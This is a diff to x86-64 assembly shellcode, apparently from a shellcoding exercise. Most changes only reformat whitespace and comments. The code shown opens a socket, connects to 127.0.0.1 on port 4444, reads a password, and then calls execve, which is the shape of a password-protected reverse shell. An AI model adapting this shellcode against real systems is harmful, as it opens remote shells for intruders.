@@ -15,10 +15,10 @@ SYS_EXECVE  equ 0x3b
 SYS_SOCKET  equ 0x29
 
 _init_socket:
-	; sock = socket(AF_INET, SOCK_STREAM, 0)
-	; AF_INET = 2
-	; SOCK_STREAM = 1
-	; syscall number 41 
+    ; sock = socket(AF_INET, SOCK_STREAM, 0)
+    ; AF_INET = 2
+    ; SOCK_STREAM = 1
+    ; syscall number 41 
 
     push SYS_SOCKET
     pop rax
@@ -28,26 +28,24 @@ _init_socket:
     pop rsi
     cdq
 
-	syscall
-
-	; save socket
-	mov rdi, rax
+    syscall
+    ; save socket
+    mov rdi, rax
 
 _init_sockaddr
-	; server.sin_family = AF_INET 
-	; server.sin_port = htons(PORT)
-	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
-	; bzero(&server.sin_zero, 8)
-
-	xor rax, rax 
+    ; server.sin_family = AF_INET 
+    ; server.sin_port = htons(PORT)
+    ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
+    ; bzero(&server.sin_zero, 8)
+    
+    xor rax, rax 
 
     ; sin_zero
-	push rax
+    push rax
 	
-    ; set ip in struct
     inc eax
     shl eax, 0x18
-    add al, 0x7f
+    add al, 0x7f  ; set ip in struct
     shl rax, 0x10
     
     ; set port 4444
@@ -58,13 +56,13 @@ _init_sockaddr
     push rax
 
 _connect:
-	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
+    ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
     push 42
     pop rax
-	mov rsi, rsp
+    mov rsi, rsp
     push 16
     pop rdx
-	syscall
+    syscall
 
 _read_pw:
 
@@ -113,3 +111,4 @@ _execve:
     syscall
  
 _burn:
+ 
